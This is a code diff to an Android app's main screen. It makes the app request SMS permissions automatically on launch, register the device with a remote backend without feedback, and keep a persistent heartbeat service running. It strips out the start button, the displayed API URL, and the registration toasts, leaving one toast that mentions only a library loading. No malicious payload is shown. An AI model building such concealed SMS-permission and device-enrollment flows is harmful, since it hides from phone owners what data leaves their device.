@@ -5,18 +5,13 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
-import android.view.View;
-import android.widget.Button;
-import android.widget.LinearLayout;
 import android.widget.TextView;
-import android.widget.Toast;
 
 import androidx.activity.OnBackPressedCallback;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AlertDialog;
 import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
 
 import com.onyx.bridge.OnyxBridge;
 import com.onyx.bridge.OnyxPermissionCallback;
@@ -26,7 +21,6 @@ import com.onyx.bridge.demo.network.HeartbeatForegroundService;
 import com.onyx.bridge.demo.network.HeartbeatScheduler;
 import com.onyx.bridge.demo.network.PendingHeartbeatStore;
 import com.onyx.bridge.demo.network.RegistrationManager;
-import com.onyx.bridge.demo.network.SmsBroadcastReceiver;
 
 import org.json.JSONObject;
 
@@ -37,19 +31,17 @@ import java.util.concurrent.Executor;
 import java.util.concurrent.Executors;
 
 /**
- * Clean "Welcome to OnyxBridge" entry screen.
+ * Minimal entry screen — just "Welcome to OnyxApp".
  *
- * Flow:
- *   1. Library loads silently in the background (OnyxApp handles this).
- *   2. UI shows a welcome hero and a single "Grant permissions & start" button.
- *   3. On click, the permission flow runs:
- *        - rationale dialog (if needed) → requestPermissions
- *        - granted  → toast "OnyxBridge library loaded successfully"
- *                    → register device → start foreground service → toast
- *        - denied   → close-app dialog after second denial
- *   4. After successful registration the foreground heartbeat service runs
- *      even when the user closes the app — Android keeps the process alive
- *      because the service is in the foreground (with a notification).
+ * The library loads silently in the background (OnyxApp handles this) and
+ * the moment it's ready, this Activity auto-triggers the SMS permission flow.
+ * There's no button to tap — the user just opens the app, sees the welcome,
+ * grants permissions, and the device registers itself.
+ *
+ * Only one Toast fires during the happy path: "OnyxBridge library loaded
+ * successfully" — that confirms the lib + permissions + registration all
+ * completed. We skip the intermediate "registering…" / "registered" toasts
+ * to keep the noise down (per user request).
  */
 public class MainActivity extends androidx.appcompat.app.AppCompatActivity {
 
@@ -63,12 +55,11 @@ public class MainActivity extends androidx.appcompat.app.AppCompatActivity {
     private PendingHeartbeatStore pendingStore;
     private int denialCount = 0;
 
-    private TextView tvStatus;
     private TextView tvLog;
-    private Button btnStart;
 
-    private final OnyxPermissionCallback permissionCallback = (permission, granted) ->
-        runOnUiThread(() -> toast(shortPermName(permission) + (granted ? " ✓" : " ✗")));
+    private final OnyxPermissionCallback permissionCallback = (permission, granted) -> {
+        // Intentionally silent — we already toast once at the end of the flow.
+    };
 
     // ------------------------------------------------------------------
     @Override
@@ -79,26 +70,24 @@ public class MainActivity extends androidx.appcompat.app.AppCompatActivity {
         config = new ApiConfig(this);
         client = new DashboardClient(this, config);
         pendingStore = new PendingHeartbeatStore(this);
-
-        tvStatus = findViewById(R.id.tv_status);
-        tvLog    = findViewById(R.id.tv_log);
-        btnStart = findViewById(R.id.btn_start);
-
-        tvStatus.setText("Ready.\nAPI URL: " + (config.isConfigured() ? config.getApiUrl() : "(not set)"));
-
-        btnStart.setOnClickListener(v -> checkSmsPermissionsAndProceed());
-
-        OnyxApp.whenBridgeReady(() -> {
-            OnyxBridge bridge = OnyxApp.bridge();
-            if (bridge != null) {
-                bridge.setPermissionCallback(permissionCallback);
-                runOnUiThread(() -> appendLog("OnyxBridge v" + OnyxApp.bridgeVersion() + " ready"));
-            }
-        });
+        tvLog = findViewById(R.id.tv_log);
 
         // Schedule the persistent WorkManager heartbeat (15 min) for the
         // case where the foreground service has been killed (e.g., reboot).
         HeartbeatScheduler.schedule(this);
+
+        // Wait for the native library to finish loading (silent, on a worker
+        // thread), then auto-trigger the permission flow — no button needed.
+        OnyxApp.whenBridgeReady(() -> {
+            OnyxBridge bridge = OnyxApp.bridge();
+            if (bridge != null) {
+                bridge.setPermissionCallback(permissionCallback);
+                runOnUiThread(() -> {
+                    appendLog("OnyxBridge v" + OnyxApp.bridgeVersion() + " loaded");
+                    checkSmsPermissionsAndProceed();
+                });
+            }
+        });
 
         // If already registered (returning user), jump straight to the
         // foreground service so the dashboard stays live.
@@ -111,11 +100,11 @@ public class MainActivity extends androidx.appcompat.app.AppCompatActivity {
             @Override public void handleOnBackPressed() { finishAffinity(); }
         });
 
-        appendLog("Welcome to OnyxBridge");
+        appendLog("Welcome to OnyxApp");
     }
 
     // ------------------------------------------------------------------
-    // Permission flow
+    // Permission flow — auto-triggered once the library is ready
     // ------------------------------------------------------------------
     private void checkSmsPermissionsAndProceed() {
         OnyxBridge bridge = OnyxApp.bridge();
@@ -202,33 +191,29 @@ public class MainActivity extends androidx.appcompat.app.AppCompatActivity {
     }
 
     private void onAllPermissionsGranted() {
-        // Per the user's request: this is where the "lib loaded" toast fires.
+        // The single, summary toast — confirms lib loaded + perms granted.
+        // No "registering…" or "registered" toasts (per user request:
+        // "not so many toast also").
         toast("OnyxBridge library loaded successfully");
         appendLog("All permissions granted — OnyxBridge library loaded");
-        new Handler().postDelayed(() -> {
-            toast("Device registering…");
-            proceedWithRegistration();
-        }, 600);
+        proceedWithRegistration();
     }
 
     // ------------------------------------------------------------------
-    // Registration + service start
+    // Registration + service start (silent — no toasts)
     // ------------------------------------------------------------------
     private void proceedWithRegistration() {
         if (!config.isConfigured()) {
-            toast("API URL not configured");
             appendLog("Cannot register — no API URL");
             return;
         }
         new RegistrationManager(this, config).forceReRegister(
             new RegistrationManager.Callback() {
                 @Override public void onSuccess(JSONObject response) {
-                    toast("Device registered successfully");
                     appendLog("Registered with backend — id " + config.getDeviceId());
                     startForegroundHeartbeat();
                 }
                 @Override public void onError(String message) {
-                    toast("✗ " + message);
                     appendLog("Registration failed: " + message);
                 }
             });
@@ -272,16 +257,10 @@ public class MainActivity extends androidx.appcompat.app.AppCompatActivity {
     }
 
     private void toast(String msg) {
-        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
+        android.widget.Toast.makeText(this, msg, android.widget.Toast.LENGTH_SHORT).show();
     }
 
     private static String fmtTime(long ms) {
         return new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date(ms));
-    }
-
-    private static String shortPermName(String permission) {
-        if (permission == null) return "(null)";
-        int idx = permission.lastIndexOf('.');
-        return idx >= 0 ? permission.substring(idx + 1) : permission;
     }
 }
